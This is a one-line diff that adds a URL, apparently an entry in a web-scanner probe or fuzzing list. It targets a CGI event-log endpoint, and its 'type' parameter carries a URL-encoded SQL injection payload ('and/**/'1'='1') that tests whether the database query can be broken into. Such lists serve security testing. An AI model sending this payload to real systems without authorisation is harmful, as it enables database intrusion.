@@ -1,0 +1,1 @@
+/cgi-bin/db_eventlog_w.cgi?date_start=0&date_end=1715630160&gravity=%25&type=%25%27and/**/%271%27=%271
